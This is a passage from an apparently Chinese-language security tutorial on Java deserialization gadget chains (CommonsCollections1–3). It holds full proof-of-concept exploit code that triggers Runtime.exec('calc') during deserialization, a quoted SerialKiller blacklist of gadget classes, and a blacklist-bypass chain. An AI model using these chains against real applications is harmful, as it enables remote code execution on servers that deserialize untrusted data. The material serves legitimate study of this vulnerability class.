memberValue.getValue();</span></span><br><span class="line">                 if (!(memberType.isInstance(value) ||</span><br><span class="line">                       value instanceof ExceptionProxy)) &#123;</span><br><span class="line"><span class="deletion">-                    memberValue.setValue(</span></span><br><span class="line"><span class="deletion">-                        new AnnotationTypeMismatchExceptionProxy(</span></span><br><span class="line"><span class="addition">+                    value = new AnnotationTypeMismatchExceptionProxy(</span></span><br><span class="line">                             value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(</span><br><span class="line"><span class="deletion">-                                annotationType.members().get(name)));</span></span><br><span class="line"><span class="addition">+                                annotationType.members().get(name));</span></span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line"><span class="addition">+            mv.put(name, value);</span></span><br><span class="line"><span class="addition">+        &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+        UnsafeAccessor.setType(this, t);</span></span><br><span class="line"><span class="addition">+        UnsafeAccessor.setMemberValues(this, mv);</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+    private static class UnsafeAccessor &#123;</span></span><br><span class="line"><span class="addition">+        private static final sun.misc.Unsafe unsafe;</span></span><br><span class="line"><span class="addition">+        private static final long typeOffset;</span></span><br><span class="line"><span class="addition">+        private static final long memberValuesOffset;</span></span><br><span class="line"><span class="addition">+        static &#123;</span></span><br><span class="line"><span class="addition">+            try &#123;</span></span><br><span class="line"><span class="addition">+                unsafe = sun.misc.Unsafe.getUnsafe();</span></span><br><span class="line"><span class="addition">+                typeOffset = unsafe.objectFieldOffset</span></span><br><span class="line"><span class="addition">+                        (AnnotationInvocationHandler.class.getDeclaredField(&quot;type&quot;));</span></span><br><span class="line"><span class="addition">+                memberValuesOffset = unsafe.objectFieldOffset</span></span><br><span class="line"><span class="addition">+                        (AnnotationInvocationHandler.class.getDeclaredField(&quot;memberValues&quot;));</span></span><br><span class="line"><span class="addition">+            &#125; catch (Exception ex) &#123;</span></span><br><span class="line"><span class="addition">+                throw new ExceptionInInitializerError(ex);</span></span><br><span class="line"><span class="addition">+            &#125;</span></span><br><span class="line"><span class="addition">+        &#125;</span></span><br><span class="line"><span class="addition">+        static void setType(AnnotationInvocationHandler o,</span></span><br><span class="line"><span class="addition">+                            Class&lt;? extends Annotation&gt; type) &#123;</span></span><br><span class="line"><span class="addition">+            unsafe.putObject(o, typeOffset, type);</span></span><br><span class="line"><span class="addition">+        &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+        static void setMemberValues(AnnotationInvocationHandler o,</span></span><br><span class="line"><span class="addition">+                                    Map&lt;String, Object&gt; memberValues) &#123;</span></span><br><span class="line"><span class="addition">+            unsafe.putObject(o, memberValuesOffset, memberValues);</span></span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="CommonsCollections1（AnnotationInvocationHandler→LazyMap）"><a href="#CommonsCollections1（AnnotationInvocationHandler→LazyMap）" class="headerlink" title="CommonsCollections1（AnnotationInvocationHandler→LazyMap）"></a>CommonsCollections1（AnnotationInvocationHandler→LazyMap）</h3><p>前面提到过，<code>LazyMap</code> 修饰过的 <code>Map</code> 只要调用 <code>get</code> 方法就会触发 <code>transform</code> 方法。然而 <code>AnnotationInvocationHandler.readObject</code> 并没有调用 <code>get</code> 方法。</p>
<p>不过幸运的是 <code>AnnotationInvocationHandler</code> 实现了 <code>InvocationHandler</code> 接口，本身是一个动态代理接口对象，也就是说只要我们把一个 <code>Map</code> 用 <code>AnnotationInvocationHandler</code> 代理，那么代理后的 <code>Map</code> 的任何方法调用都会执行到 <code>AnnotationInvocationHandler</code> 的 <code>invoke</code> 方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br></pre></td></tr></table></figure></div>
<p><code>AnnotationInvocationHandler</code> 的 <code>invoke</code> 方法特判几种方法后会调用 <code>memberValues</code> 的 <code>get</code> 方法，也就会触发 <code>LazyMap</code> 的 <code>transform</code> 方法调用。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">member</span> <span class="operator">=</span> method.getName();</span><br><span class="line">    Class&lt;?&gt;[] paramTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Handle Object and Annotation methods</span></span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">        paramTypes[<span class="number">0</span>] == Object.class)</span><br><span class="line">        <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> (paramTypes.length != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(member) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;toString&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> toStringImpl();</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;hashCode&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> hashCodeImpl();</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;annotationType&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Handle annotation member accessors</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> memberValues.get(member);  <span class="comment">// 调用 get 方法</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IncompleteAnnotationException</span>(type, member);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result <span class="keyword">instanceof</span> ExceptionProxy)</span><br><span class="line">        <span class="keyword">throw</span> ((ExceptionProxy) result).generateException();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result.getClass().isArray() &amp;&amp; Array.getLength(result) != <span class="number">0</span>)</span><br><span class="line">        result = cloneArray(result);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>完整 poc 如下，需要注意的是代理之后任何对 <code>proxyMap</code> 的操作都会触发 <code>transformer</code> 调用，因此需要最后设置恶意的 <code>Transformer</code>。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);</span><br><span class="line">        </span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(handler);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>调用栈如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">transform:122, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:158, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">invoke:69, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">entrySet:-1, $Proxy1 (com.sun.proxy) 内层 AnnotationInvocationHandler 代理的 Map</span><br><span class="line">readObject:349, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">...</span><br><span class="line">main:42, CommonsCollections1 (com.example)</span><br></pre></td></tr></table></figure></div>
<h3 id="CommonsCollections2（PriorityQueue→TransformingComparator）"><a href="#CommonsCollections2（PriorityQueue→TransformingComparator）" class="headerlink" title="CommonsCollections2（PriorityQueue→TransformingComparator）"></a>CommonsCollections2（PriorityQueue→TransformingComparator）</h3><p>前面提到，<code>TransformingComparator</code> 在比较时会对比较的对象调用 <code>transform</code> 方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Object obj1, Object obj2)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>而 Java 中内置的维护顺序的容器如 <code>PriorityQueue</code> 在反序列化时会对内部的元素进行排序，这个过程中在 <code>siftDownUsingComparator</code> 函数内涉及了元素大小的比较。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDownUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">child</span> <span class="operator">=</span> (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">c</span> <span class="operator">=</span> queue[child];</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> child + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">            comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDown</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="literal">null</span>)</span><br><span class="line">        siftDownUsingComparator(k, x);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        siftDownComparable(k, x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">    s.readInt();</span><br><span class="line"></span><br><span class="line">    queue = <span class="keyword">new</span> <span class="title class_">Object</span>[size];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span></span><br><span class="line">    <span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>因此我们只需要在创建 <code>PriorityQueue</code> 容器时指定比较对象为我们定义的 <code>TransformingComparator</code>，之后往 <code>PriorityQueue</code> 中随便放两个元素，那么在反序列化时就会调用 <code>comparator.compare</code> 方法触发 <code>transform</code> 方法调用。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,comparator);</span><br></pre></td></tr></table></figure></div>
<p>poc 如下：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line">        <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,comparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(queue);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>注意，类 <code>org.apache.commons.collections4.comparators.TransformingComparator</code>，在 commons-collections4.0 以前是版本中是没有实现 <code>Serializable</code> 接口的，无法在序列化中使用。</p>
<h3 id="CommonsCollections3（…→TrAXFilter→InstantiateTransformer）"><a href="#CommonsCollections3（…→TrAXFilter→InstantiateTransformer）" class="headerlink" title="CommonsCollections3（…→TrAXFilter→InstantiateTransformer）"></a>CommonsCollections3（…→TrAXFilter→InstantiateTransformer）</h3><p>2015 年初，@frohoff 和 @gebl 发布了 Talk《<a class="link"   href="https://frohoff.github.io/appseccali-marshalling-pickles/" >Marshalling Pickles: how deserializing objects will ruin your day <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>》，以及 Java 反序列化利用工具 ysoserial，随后引爆了安全界。开发者们⾃然会去找寻一种安全的过滤方法，于是类似 <a class="link"   href="https://github.com/ikkisoft/SerialKiller" >SerialKiller <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 这样的工具随之诞生。</p>
<p>SerialKiller 是一个 Java 反序列化过滤器，可以通过黑名单与白名单的方式来限制反序列化时允许通过的类。在其发布的第一个版本代码中，我们可以看到其给出了最初的<a class="link"   href="https://github.com/ikkisoft/SerialKiller/blob/998c0abc5b/config/serialkiller.conf" >黑名单 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>：</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- serialkiller.conf --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">config</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">refresh</span>&gt;</span>6000<span class="tag">&lt;/<span class="name">refresh</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">blacklist</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- ysoserial&#x27;s CommonsCollections1 payload  --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>^org\.apache\.commons\.collections\.functors\.InvokerTransformer$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span>	</span><br><span class="line">	<span class="comment">&lt;!-- ysoserial&#x27;s CommonsCollections2 payload  --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>^org\.apache\.commons\.collections4\.functors\.InvokerTransformer$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- ysoserial&#x27;s Groovy payload  --&gt;</span>	</span><br><span class="line">        <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>^org\.codehaus\.groovy\.runtime\.ConvertedClosure$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span>	</span><br><span class="line">        <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>^org\.codehaus\.groovy\.runtime\.MethodClosure$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span>	</span><br><span class="line">	<span class="comment">&lt;!-- ysoserial&#x27;s Spring1 payload  --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">regexp</span>&gt;</span>^org\.springframework\.beans\.factory\.ObjectFactory$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span>	</span><br><span class="line">    <span class="tag">&lt;/<span class="name">blacklist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">whitelist</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>.*<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">whitelist</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">config</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>这个黑名单中 <code>InvokerTransformer</code> 赫然在列，也就切断了 <code>CommonsCollections1</code> 的利⽤链。有攻就有防，ysoserial 随后增加了不少新的 Gadgets，其中就包括 CommonsCollections3。</p>
<p>CommonsCollections3 的目的很明显，就是为了绕过一些规则对 <code>InvokerTransformer</code> 的限制。CommonsCollections3 并没有使用到 <code>InvokerTransformer</code> 来调用任意方法，而是用到了另一个类，<code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code>。</p>
<p>这个类的构造方法中调用了 <code>(TransformerImpl) templates.newTransformer()</code> ，免去了我们使用 <code>InvokerTransformer</code> 手工调用 <code>newTransformer()</code> 方法这一步：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span><br><span class="line">    TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    _templates = templates;</span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer(); <span class="comment">// &lt;---</span></span><br><span class="line">    _transformerHandler = <span class="keyword">new</span> <span class="title class_">TransformerHandlerImpl</span>(_transformer);</span><br><span class="line">    _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>我们可以构造如下 <code>ChainedTransformer</code>：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj&#125;),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
